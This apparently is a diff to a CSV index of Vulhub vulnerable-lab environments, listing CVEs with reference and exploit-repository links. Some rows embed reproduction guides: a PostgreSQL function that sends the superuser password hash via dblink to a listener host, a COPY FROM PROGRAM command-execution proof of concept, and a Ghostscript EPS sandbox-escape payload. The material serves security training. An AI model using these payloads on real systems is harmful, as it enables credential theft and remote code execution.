+nginx,CVE-2017-7529,Nginx Cache Leak by Integer Overflow (CVE-2017-7529),"https://cert.360.cn/detailnews.html?id=b879782fbad4a7f773b6c18490d67ac7
+http://galaxylab.org/cve-2017-7529-nginx%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/
+http://your-ip:8080/`",https://github.com/vulhub/vulhub/tree/master/nginx/CVE-2017-7529,docker-compose,docker compose up,remote
+node,CVE-2017-14849,Node.js 8.5.0 Path Traversal (CVE-2017-14849),"https://nodejs.org/en/blog/vulnerability/september-2017-path-validation/
+https://security.tencent.com/index.php/blog/msg/121",https://github.com/vulhub/vulhub/tree/master/node/CVE-2017-14849,docker-compose,docker compose up,remote
+node,CVE-2017-16082,Node-Postgres Remote Code Execution (CVE-2017-16082),"https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html
+https://node-postgres.com/announcements#2017-08-12-code-execution-vulnerability
+https://zhuanlan.zhihu.com/p/28575189",https://github.com/vulhub/vulhub/tree/master/node/CVE-2017-16082,docker-compose,docker compose up,remote
+ntopng,CVE-2021-28073,ntopng Authentication Bypass (CVE-2021-28073),"http://noahblog.360.cn/ntopng-multiple-vulnerabilities/
+http://your-ip:3000/
+http://your-ip:3000/",https://github.com/vulhub/vulhub/tree/master/ntopng/CVE-2021-28073,docker-compose,docker compose up,remote
+ofbiz,CVE-2024-38856,Apache OFBiz Authentication Bypass Leads to RCE (CVE-2024-38856),"https://github.com/apache/ofbiz-framework/commit/31d8d7
+https://forum.butian.net/article/524
+https://github.com/Praison001/CVE-2024-38856-ApacheOfBiz",https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2024-38856,docker-compose,docker compose up,remote
+ofbiz,CVE-2023-49070,Unsafe deserialization of XMLRPC arguments in Apache OFBiz (CVE-2023-49070),"https://www.openwall.com/lists/oss-security/2023/12/04/2
+https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2020-9496",https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2023-49070,docker-compose,docker compose up,remote
+ofbiz,CVE-2023-51467,Apache OFBiz Authentication Bypass Leads to RCE (CVE-2023-51467),"https://github.com/apache/ofbiz-framework/commit/d8b097f6717a4004acf023dfe929e0e41ad63faa
+https://xz.aliyun.com/t/13211
+https://y4tacker.github.io/2023/12/27/year/2023/12/Apache-OFBiz%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%B5%85%E6%9E%90-CVE-2023-51467/",https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2023-51467,docker-compose,docker compose up,remote
+ofbiz,CVE-2020-9496,Unsafe deserialization of XMLRPC arguments in ApacheOfBiz (CVE-2020-9496),"https://securitylab.github.com/advisories/GHSL-2020-069-apache_ofbiz
+https://github.com/dwisiswant0/CVE-2020-9496
+https://www.cnblogs.com/ph4nt0mer/p/13576739.html",https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2020-9496,docker-compose,docker compose up,remote
+ofbiz,CVE-2024-45195,Apache OFBiz Authentication Bypass Leads to RCE (CVE-2024-45195),"https://github.com/apache/ofbiz-framework/commit/ab78769c2d
+https://github.com/apache/ofbiz-plugins/commit/8b95fe6fa
+https://www.rapid7.com/blog/post/2024/09/05/cve-2024-45195-apache-ofbiz-unauthenticated-remote-code-execution-fixed/",https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2024-45195,docker-compose,docker compose up,remote
+ofbiz,CVE-2024-45507,Apache OFBiz SSRF and Remote Code Execution (CVE-2024-45507),"https://github.com/apache/ofbiz-framework/commit/ffb1bc4879
+https://xz.aliyun.com/t/15569
+https://paper.seebug.org/3228/
+http://ofbiz.apache.org/dtds/widget-screen.xsd"">",https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2024-45507,docker-compose,docker compose up,remote
+openfire,CVE-2023-32315,Openfire Admin Console Authentication Bypass (CVE-2023-32315),"https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm
+https://mp.weixin.qq.com/s/EzfB8CM4y4aNtKFJqSOM1w",https://github.com/vulhub/vulhub/tree/master/openfire/CVE-2023-32315,docker-compose,docker compose up,remote
+opensmtpd,CVE-2020-7247,OpenSMTPD Remote Code Execution Vulnerability (CVE-2020-7247),"https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-rce-opensmtpd.txt
+https://www.exploit-db.com/exploits/47984
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7247
+https://www.anquanke.com/post/id/197689",https://github.com/vulhub/vulhub/tree/master/opensmtpd/CVE-2020-7247,docker-compose,docker compose up,remote
+openssh,CVE-2018-15473,OpenSSH Username Enumeration (CVE-2018-15473),"http://openwall.com/lists/oss-security/2018/08/15/5
+https://github.com/Rhynorater/CVE-2018-15473-Exploit
+https://www.anquanke.com/post/id/157607",https://github.com/vulhub/vulhub/tree/master/openssh/CVE-2018-15473,docker-compose,docker compose up,remote
+openssl,CVE-2014-0160,OpenSSL Heartbleed Memory Leak Leads to Information Disclosure (CVE-2014-0160),"https://heartbleed.com/
+https://filippo.io/Heartbleed",https://github.com/vulhub/vulhub/tree/master/openssl/CVE-2014-0160,docker-compose,docker compose up,remote
+openssl,CVE-2022-0778,OpenSSL Infinite Loop Leads to DoS (CVE-2022-0778),"https://github.com/drago-96/CVE-2022-0778
+https://www.cnblogs.com/logchen/p/16030515.html
+https://catbro666.github.io/posts/83951100/
+https://github.com/yywing/cve-2022-0778
+https://host.docker.internal:12345",https://github.com/vulhub/vulhub/tree/master/openssl/CVE-2022-0778,docker-compose,docker compose up,remote
+openssl,Unknown,"This page moved to CVE-2014-0160
+-------------------------------------------------------------------------------",,unknown,docker-compose,docker compose up,remote
+opentsdb,CVE-2023-25826,OpenTSDB Arbitrary Command Injection Remote Code Execution（CVE-2023-25826）,"https://www.synopsys.com/blogs/software-security/opentsdb/
+https://github.com/OpenTSDB/opentsdb/pull/2275",https://github.com/vulhub/vulhub/tree/master/opentsdb/CVE-2023-25826,docker-compose,docker compose up,remote
+opentsdb,CVE-2020-35476,OpenTSDB Arbitrary Command Injection Remote Code Execution (CVE-2020-35476),"https://github.com/OpenTSDB/opentsdb/issues/2051
+https://packetstormsecurity.com/files/136753/OpenTSDB-Remote-Code-Execution.html",https://github.com/vulhub/vulhub/tree/master/opentsdb/CVE-2020-35476,docker-compose,docker compose up,remote
+pdfjs,CVE-2024-4367,PDF.js Arbitrary JavaScript Code Execution (CVE-2024-4367),https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/,https://github.com/vulhub/vulhub/tree/master/pdfjs/CVE-2024-4367,docker-compose,docker compose up,remote
+pgadmin,CVE-2023-5002,pgAdmin <= 7.6 Authenticated Remote Command Execution (CVE-2023-5002),"https://github.com/pgadmin-org/pgadmin4/commit/35f05e49b3632a0a674b9b36535a7fe2d93dd0c2
+https://github.com/advisories/GHSA-ghp8-52vx-77j4",https://github.com/vulhub/vulhub/tree/master/pgadmin/CVE-2023-5002,docker-compose,docker compose up,remote
+pgadmin,CVE-2022-4223,pgAdmin <= 6.16 Unauthenticated Remote Command Execution (CVE-2022-4223),"https://github.com/pgadmin-org/pgadmin4/commit/799b6d8f7c10e920c9e67c2c18d381d6320ca604
+https://github.com/pgadmin-org/pgadmin4/commit/461849c2763e680ed2296bb8a753ca7aef546595
+https://github.com/advisories/GHSA-3v6v-2x6p-32mc",https://github.com/vulhub/vulhub/tree/master/pgadmin/CVE-2022-4223,docker-compose,docker compose up,remote
+php,Unknown,PHP XDebug Remote Debugging Code Execution,"https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface
+https://xdebug.org
+http://[target-ip]:8080/index.php
+http://[target-ip]:8081/index.php",unknown,docker-compose,docker compose up,remote
+php,Unknown,PHP XML External Entity Injection (XXE),,unknown,docker-compose,docker compose up,remote
+php,Unknown,PHP-FPM FastCGI Unauthorized Access Leads to Remote Code Execution,"https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html
+https://www.php.net/manual/en/install.fpm.php
+https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75",unknown,docker-compose,docker compose up,remote
+php,CVE-2019-11043,PHP-FPM Remote Code Execution (CVE-2019-11043),"https://bugs.php.net/bug.php?id=78599
+https://lab.wallarm.com/php-remote-code-execution-0-day-discovered-in-real-world-ctf-exercise/
+https://github.com/neex/phuip-fpizdam
+https://github.com/neex/phuip-fpizdam:",https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043,docker-compose,docker compose up,remote
+php,Unknown,PHP 8.1.0-dev User-Agentt Backdoor Remote Code Execution,"https://news-web.php.net/php.internals/113838
+https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d
+https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a",unknown,docker-compose,docker compose up,remote
+php,Unknown,PHP Local File Inclusion RCE with PHPINFO,https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf,unknown,docker-compose,docker compose up,remote
+php,CVE-2012-1823,PHP-CGI Remote Code Execution (CVE-2012-1823),"http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/
+https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html",https://github.com/vulhub/vulhub/tree/master/php/CVE-2012-1823,docker-compose,docker compose up,remote
+php,CVE-2018-19518,PHP IMAP Remote Command Execution (CVE-2018-19518),"https://bugs.php.net/bug.php?id=77153
+https://github.com/Bo0oM/PHP_imap_open_exploit
+https://antichat.com/threads/463395/#post-4254681
+https://nvd.nist.gov/vuln/detail/CVE-2018-19518",https://github.com/vulhub/vulhub/tree/master/php/CVE-2018-19518,docker-compose,docker compose up,remote
+php,CVE-2024-2961,PHP File Read to Remote Code Execution Through GNU C Library Iconv (CVE-2024-2961),"https://www.ambionics.io/blog/iconv-cve-2024-2961-p1
+https://github.com/cfreal/ten/archive/refs/heads/main.zip
+https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py
+https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py
+http://your-ip:8080/index.php",https://github.com/vulhub/vulhub/tree/master/php/CVE-2024-2961,docker-compose,docker compose up,remote
+phpmailer,CVE-2017-5223,PHPMailer Arbitrary File Read (CVE-2017-5223),"http://www.freebuf.com/vuls/124820.html
+https://www.exploit-db.com/exploits/43056/",https://github.com/vulhub/vulhub/tree/master/phpmailer/CVE-2017-5223,docker-compose,docker compose up,remote
+phpmyadmin,Unknown,Phpmyadmin Scripts/setup.php Deserialization Vulnerability (WooYun-2016-199433),,unknown,docker-compose,docker compose up,remote
+phpmyadmin,CVE-2016-5734,PhpMyAdmin 4.0.x—4.6.2 Remote Code Execution Vulnerability (CVE-2016-5734),http://your-ip:8080/,https://github.com/vulhub/vulhub/tree/master/phpmyadmin/CVE-2016-5734,docker-compose,docker compose up,remote
+phpmyadmin,CVE-2018-12613,phpmyadmin 4.8.1 Remote File Inclusion Vulnerability (CVE-2018-12613),"https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog
+https://www.phpmyadmin.net/security/PMASA-2018-4/",https://github.com/vulhub/vulhub/tree/master/phpmyadmin/CVE-2018-12613,docker-compose,docker compose up,remote
+phpunit,CVE-2017-9841,PHPUnit Remote Code Execution (CVE-2017-9841),"http://web.archive.org/web/20170701212357/http://phpunit.vulnbusters.com/
+https://www.ovh.com/blog/cve-2017-9841-what-is-it-and-how-do-we-protect-our-customers/",https://github.com/vulhub/vulhub/tree/master/phpunit/CVE-2017-9841,docker-compose,docker compose up,remote
+polkit,CVE-2021-4034,Polkit's pkexec Local Privilege Escalation Vulnerability (CVE-2021-4034),"https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
+https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034
+https://github.com/berdav/CVE-2021-4034
+https://github.com/berdav/CVE-2021-4034/archive/refs/heads/main.tar.gz
+https://github.com/berdav/CVE-2021-4034/archive/refs/heads/main.tar.gz
+https://codeload.github.com/berdav/CVE-2021-4034/tar.gz/refs/heads/main
+https://codeload.github.com/berdav/CVE-2021-4034/tar.gz/refs/heads/main",https://github.com/vulhub/vulhub/tree/master/polkit/CVE-2021-4034,docker-compose,docker compose up,remote
+postgres,CVE-2018-1058,"PostgreSQL Privilege Escalation (CVE-2018-1058)
+
+中文文档
+
+PostgreSQL is a powerful open-source relational database system. A logical error exists in versions 9.3 through 10, where superusers can unknowingly execute malicious code created by regular users, leading to unexpected operations.
+
+References:
+https://wiki.postgresql.org/wiki/AGuidetoCVE-2018-1058:ProtectYourSearch_Path
+https://xianzhi.aliyun.com/forum/topic/2109
+
+Environment Setup
+
+Execute the following command to start a vulnerable PostgreSQL server:
+
+
+docker compose up -d
+
+
+The server will start and listen on the default PostgreSQL port 5432.
+
+Vulnerability Reproduction
+
+Following the second exploitation method from the references, we'll first connect to PostgreSQL as the regular user vulhub:vulhub:
+
+bash
+psql --host your-ip --username vulhub
+
+
+
+
+Execute the following SQL statements and then exit:
+
+sql
+CREATE FUNCTION public.arraytostring(anyarray,text) RETURNS TEXT AS $$
+    select dblinkconnect((select 'hostaddr=10.0.0.1 port=5433 user=postgres password=chybeta sslmode=disable dbname='||(SELECT passwd FROM pgshadow WHERE usename='postgres'))); 
+    SELECT pgcatalog.arrayto_string($1,$2);
+$$ LANGUAGE SQL VOLATILE;
+
+
+Now, set up a listener on port 5433 at 10.0.0.1 to wait for the superuser to trigger our ""backdoor"".
+
+(Simulating superuser actions) On the target machine, execute the pg_dump command as the superuser:
+
+bash
+docker compose exec postgres pg_dump -U postgres -f evil.bak vulhub
+
+
+This command will export the contents of the vulhub database. When executed, our ""backdoor"" is triggered, and sensitive information is received on the 10.0.0.1 machine:
+
+
+
+This is just one of several exploitation methods for this vulnerability. For more exploitation techniques, please refer to the articles in the References section.
+-------------------------------------------------------------------------------","https://wiki.postgresql.org/wiki/A_Guide_to_CVE-2018-1058:_Protect_Your_Search_Path
+https://xianzhi.aliyun.com/forum/topic/2109",https://github.com/vulhub/vulhub/tree/master/postgres/CVE-2018-1058,docker-compose,docker compose up,remote
+postgres,CVE-2019-9193,"PostgreSQL Arbitrary Command Execution with Admin Privileges (CVE-2019-9193)
+
+中文文档
+
+PostgreSQL is a powerful open-source relational database system. A ""feature"" exists in versions 9.3 through 11 that allows administrators or users with ""COPY TO/FROM PROGRAM"" privileges to execute arbitrary commands on the system.
+
+References:
+<https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5
+
+Environment Setup
+
+Execute the following command to start a vulnerable PostgreSQL 10.7 server:
+
+
+docker compose up -d
+
+
+The server will start and listen on the default PostgreSQL port 5432, with default credentials postgres/postgres.
+
+Vulnerability Reproduction
+
+First, connect to the PostgreSQL server and execute the following proof of concept:
+
+sql
+DROP TABLE IF EXISTS cmd_exec;
+CREATE TABLE cmdexec(cmdoutput text);
+COPY cmd_exec FROM PROGRAM 'id';
+SELECT * FROM cmd_exec;
+
+
+The FROM PROGRAM statement will execute the id command and save the results in the cmd_exec table:
+-------------------------------------------------------------------------------",https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5,https://github.com/vulhub/vulhub/tree/master/postgres/CVE-2019-9193,docker-compose,docker compose up,remote
+python,Unknown,Python PIL/Pillow Remote Command Execution (GhostButt / CVE-2017-8291),,unknown,docker-compose,docker compose up,remote
+python,Unknown,"Python PIL/Pillow Remote Command Execution (CVE-2018-16509)
+
+中文文档
+
+PIL/Pillow is a widely used image processing library in Python.
+
+In Ghostscript versions prior to 9.24, there exists a -dSAFER sandbox bypass vulnerability (CVE-2018-16509). Incorrect ""restoration of privilege"" checking during handling of /invalidaccess exceptions could be used by attackers able to supply crafted PostScript to execute code using the ""pipe"" instruction.
+
+This vulnerability affects various applications that use Ghostscript for image processing, including Python's PIL/Pillow library. When an application uses PIL/Pillow to process user-uploaded images and the environment has a vulnerable version of Ghostscript installed, it may lead to remote command execution.
+
+References:
+Ghostscript: -dSAFER bypass (CVE-2018-16509)
+PIL/Pillow EPS Image Processing
+Ghostscript Sandbox Bypass Analysis
+
+Environment Setup
+
+Execute the following command to start a vulnerable Flask application (using Ghostscript 9.23):
+
+
+docker compose up -d
+
+
+After the environment is started, visit http://your-ip:8000 to see a simple image upload page.
+
+Vulnerability Reproduction
+
+Prepare a malicious EPS file (provided as rce.jpg in this environment) with the following content:
+
+
+%!PS-Adobe-3.0 EPSF-3.0
+%%BoundingBox: -0 -0 100 100
+
+userdict /setpagedevice undef
+save
+legal
+{ null restore } stopped { pop } if
+{ legal } stopped { pop } if
+restore
+mark /OutputFile (%pipe%touch /tmp/got_rce) currentdevice putdeviceprops
+
+
+Visit http://your-ip:8000 and upload this file.
+
+After uploading, the server will process this image using PIL/Pillow, and when the resize function is called, it will trigger the vulnerability and execute the touch /tmp/got_rce command.
+
+Execute the following command to verify if the vulnerability has been successfully exploited:
+
+
+docker compose exec web ls -la /tmp/
+
+
+If you see the /tmp/got_rce file, it means the command execution was successful.
+
+Vulnerability Analysis
+
+The core of the vulnerability lies in PIL/Pillow calling the system's Ghostscript program when processing EPS images. In EPSImagePlugin.py, PIL uses subprocess to call Ghostscript:
+
+python
+command = [""gs"",
+           ""-q"",                         # quiet mode
+           ""-g%dx%d"" % size,             # set output geometry (pixels)
+           ""-r%fx%f"" % res,              # set input DPI (dots per inch)
+           ""-dBATCH"",                    # exit after processing
+           ""-dNOPAUSE"",                  # don't pause between pages
+           ""-dSAFER"",                    # safe mode
+           ""-sDEVICE=ppmraw"",            # ppm driver
+           ""-sOutputFile=%s"" % outfile,  # output file
+           ""-c"", ""%d %d translate"" % (-bbox[0], -bbox[1]),
+                                         # adjust for image origin
+           ""-f"", infile,                 # input file
+           ""-c"", ""showpage"",             # showpage
+           ]
+
+
+Although the -dSAFER parameter is used, Ghostscript versions prior to 9.24 have a sandbox bypass vulnerability that allows attackers to execute arbitrary commands through specially crafted PostScript code.
+
+In the sample application, when an image is uploaded, it is processed as follows:
+
+python
+img = Image.open(img_path)
+w, h = img.size
+ratio = 256.0 / max(w, h)
+
+resized_img = img.resize((int(w  ratio), int(h  ratio)))
+resizedimg.save(imgpath)
+
+
+Simply calling Image.open() will not trigger the vulnerability, but when methods that actually need to load image data, such as resize() or save(), are called, they will trigger the Ghostscript call and execute malicious commands.
+
+To fix this vulnerability, you need to update Ghostscript to version 9.24 or higher, or disable EPS image processing functionality when using PIL/Pillow to process user-uploaded images.
+-------------------------------------------------------------------------------",,unknown,docker-compose,docker compose up,remote
+python,Unknown,Python Unpickle Deserialization Remote Code Execution,"http://rickgray.me/2015/09/12/django-command-execution-analysis.html
+https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html
+https://docs.python.org/3/library/pickle.html#pickle.loads
+https://intoli.com/blog/dangerous-pickles/",unknown,docker-compose,docker compose up,remote
+rails,CVE-2019-5418,Ruby on Rails Path Traversal and Arbitrary File Read (CVE-2019-5418),"https://groups.google.com/forum/#!topic/rubyonrails-security/pFRKI96Sm8Q
+https://github.com/mpgn/CVE-2019-5418
+https://xz.aliyun.com/t/4448",https://github.com/vulhub/vulhub/tree/master/rails/CVE-2019-5418,docker-compose,docker compose up,remote
+rails,CVE-2018-3760,Ruby On Rails Path Traversal Vulnerability（CVE-2018-3760）,"https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
+https://seclists.org/oss-sec/2018/q2/210
+https://xz.aliyun.com/t/2542",https://github.com/vulhub/vulhub/tree/master/rails/CVE-2018-3760,docker-compose,docker compose up,remote
+redis,Unknown,Redis Post Exploitation Due to Master and Slave Synchronisation,https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf,unknown,docker-compose,docker compose up,remote
+redis,CVE-2022-0543,Redis Lua Sandbox Escape and Remote Code Execution (CVE-2022-0543),"https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce
+https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1005787",https://github.com/vulhub/vulhub/tree/master/redis/CVE-2022-0543,docker-compose,docker compose up,remote
+rocketchat,CVE-2021-22911,Rocket Chat Pre-Auth Blind NoSQL Injection (CVE-2021-22911),"https://blog.sonarsource.com/nosql-injections-in-rocket-chat
+https://www.exploit-db.com/exploits/50108
+https://github.com/CsEnox/CVE-2021-22911
+https://paper.seebug.org/1652/",https://github.com/vulhub/vulhub/tree/master/rocketchat/CVE-2021-22911,docker-compose,docker compose up,remote
+rocketmq,CVE-2023-33246,Apache RocketMQ Broker Remote Command Execution (CVE-2023-33246),"https://github.com/I5N0rth/CVE-2023-33246
+https://github.com/Le1a/CVE-2023-33246
+https://paper.seebug.org/2081/
+https://xz.aliyun.com/news/12137
+https://xz.aliyun.com/news/12035
+https://github.com/vulhub/rocketmq-attack/releases/download/1.0/rocketmq-attack-1.0-SNAPSHOT.jar",https://github.com/vulhub/vulhub/tree/master/rocketmq/CVE-2023-33246,docker-compose,docker compose up,remote
+rocketmq,CVE-2023-37582,Apache RocketMQ NameServer Arbitrary File Write (CVE-2023-37582),"https://github.com/apache/rocketmq/pull/6843
+https://drun1baby.top/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/
+https://github.com/Malayke/CVE-2023-37582_EXPLOIT
+https://github.com/vulhub/rocketmq-attack/releases/download/1.1/rocketmq-attack-1.1-SNAPSHOT.jar",https://github.com/vulhub/vulhub/tree/master/rocketmq/CVE-2023-37582,docker-compose,docker compose up,remote
+rsync,Unknown,Rsync Unauthorized Access,,unknown,docker-compose,docker compose up,remote
+ruby,CVE-2017-17405,Ruby Net::FTP Module Command Injection (CVE-2017-17405),"https://blog.heroku.com/identifying-ruby-ftp-cve
+https://www.exploit-db.com/exploits/43381",https://github.com/vulhub/vulhub/tree/master/ruby/CVE-2017-17405,docker-compose,docker compose up,remote
+saltstack,CVE-2020-11652,SaltStack Arbitrary File Read and Write (CVE-2020-11652),"https://labs.f-secure.com/advisories/saltstack-authorization-bypass
+https://github.com/rossengeorgiev/salt-security-backports
+https://github.com/jasperla/CVE-2020-11651-poc",https://github.com/vulhub/vulhub/tree/master/saltstack/CVE-2020-11652,docker-compose,docker compose up,remote
+saltstack,CVE-2020-16846,SaltStack Command Injection Remote Code Execution (CVE-2020-16846),"https://mp.weixin.qq.com/s/R8qw_lWizGyeJS0jOcYXag
+https://docs.saltstack.com/en/latest/ref/netapi/all/salt.netapi.rest_cherrypy.html",https://github.com/vulhub/vulhub/tree/master/saltstack/CVE-2020-16846,docker-compose,docker compose up,remote
+saltstack,CVE-2020-11651,SaltStack Information Disclosure Leads to Privilege Escalation (CVE-2020-11651),"https://labs.f-secure.com/advisories/saltstack-authorization-bypass
+https://github.com/rossengeorgiev/salt-security-backports
+https://github.com/saltstack/salt/blob/a67d76b15615983d467ed81371b38b4a17e4f3b7/tests/integration/master/test_clear_funcs.py",https://github.com/vulhub/vulhub/tree/master/saltstack/CVE-2020-11651,docker-compose,docker compose up,remote
+samba,CVE-2017-7494,"Samba Authenticated RCE (CVE-2017-7494, Aka SambaCry)","https://medium.com/@lucideus/sambacry-rce-exploit-lucideus-research-3a3e5bd9e17c
+https://github.com/opsxcq/exploit-CVE-2017-7494
+http://bobao.360.cn/learning/detail/3900.html
+https://github.com/opsxcq/exploit-CVE-2017-7494",https://github.com/vulhub/vulhub/tree/master/samba/CVE-2017-7494,docker-compose,docker compose up,remote
+scrapy,Unknown,Scrapyd Pre-Auth Remote Code Execution,"https://www.leavesongs.com/PENETRATION/attack-scrapy.html
+http://your-ip:6800/addversion.json",unknown,docker-compose,docker compose up,remote
+shiro,CVE-2016-4437,Apache Shiro 1.2.4 Deserialization Remote Code Execution (CVE-2016-4437),,https://github.com/vulhub/vulhub/tree/master/shiro/CVE-2016-4437,docker-compose,docker compose up,remote
+shiro,CVE-2020-1957,Apache Shiro Authentication Bypass Vulnerability (CVE-2020-1957),"https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce#diff-98f7bc5c0391389e56531f8b3754081aL139
+https://xz.aliyun.com/t/8281
+https://blog.spoock.com/2020/05/09/cve-2020-1957/",https://github.com/vulhub/vulhub/tree/master/shiro/CVE-2020-1957,docker-compose,docker compose up,remote
+shiro,CVE-2010-3863,Apache Shiro Authentication Bypass Vulnerability (CVE-2010-3863),"https://github.com/apache/shiro/commit/ab8294940a19743583d91f0c7e29b405d197cc34
+https://xz.aliyun.com/t/11633#toc-2
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3863",https://github.com/vulhub/vulhub/tree/master/shiro/CVE-2010-3863,docker-compose,docker compose up,remote
+showdoc,Unknown,ShowDoc 3.2.5 SQL Injection,"https://github.com/star7th/showdoc/commit/84fc28d07c5dfc894f5fbc6e8c42efd13c976fda
+http://localhost:8080",unknown,docker-compose,docker compose up,remote
+showdoc,Unknown,ShowDoc Unauthenticated File Upload and Remote Code Execution (CNVD-2020-26585),"https://github.com/star7th/showdoc/pull/1059
+https://github.com/star7th/showdoc/commit/fb77dd4db88dc23f5e570fc95919ee882aca520a
+https://github.com/star7th/showdoc/commit/e1cd02a3f98bb227c0599e7fa6b803ab1097597f",unknown,docker-compose,docker compose up,remote
+skywalking,Unknown,Apache Skywalking 8.3.0 SQL Injection Vulnerability,"https://mp.weixin.qq.com/s/hB-r523_4cM0jZMBOt6Vhw
+https://github.com/apache/skywalking/commit/0bd81495965d801315dd7417bb17333ae0eccf3b#diff-ec87a1cdf66cdb37574d9eafd4d72d99ed94a38c4a8ff2aa9c7b8daeff502a2c",unknown,docker-compose,docker compose up,remote
+solr,CVE-2019-17558,Apache Solr Remote Code Execution Via Velocity Template (CVE-2019-17558),"https://nvd.nist.gov/vuln/detail/CVE-2019-17558
+https://issues.apache.org/jira/browse/SOLR-13971
+https://gist.github.com/s00py/a1ba36a3689fa13759ff910e179fc133
+https://github.com/jas502n/solr_rce",https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-17558,docker-compose,docker compose up,remote
+solr,CVE-2017-12629,Apache Solr XML External Entity Injection (CVE-2017-12629),"https://www.exploit-db.com/exploits/43009/
+https://paper.seebug.org/425/",https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629,docker-compose,docker compose up,remote
+solr,CVE-2019-0193,Apache Solr Remote Command Execution (CVE-2019-0193),"https://mp.weixin.qq.com/s/typLOXZCev_9WH_Ux0s6oA
+https://paper.seebug.org/1009/
+http://your-ip:8983
+http://your-ip:8983/solr/",https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193,docker-compose,docker compose up,remote
+solr,Unknown,Apache Solr RemoteStreaming Arbitrary File Reading and SSRF,https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ,unknown,docker-compose,docker compose up,remote
+solr,CVE-2017-12629,Apache Solr Remote Command Execution (CVE-2017-12629),"https://www.exploit-db.com/exploits/43009/
+https://paper.seebug.org/425/",https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629,docker-compose,docker compose up,remote
+spark,Unknown,Apache Spark Unauthorized Access Leads to Remote Code Execution,"https://weibo.com/ttarticle/p/show?id=2309404187794313453016
+https://xz.aliyun.com/t/2490",unknown,docker-compose,docker compose up,remote
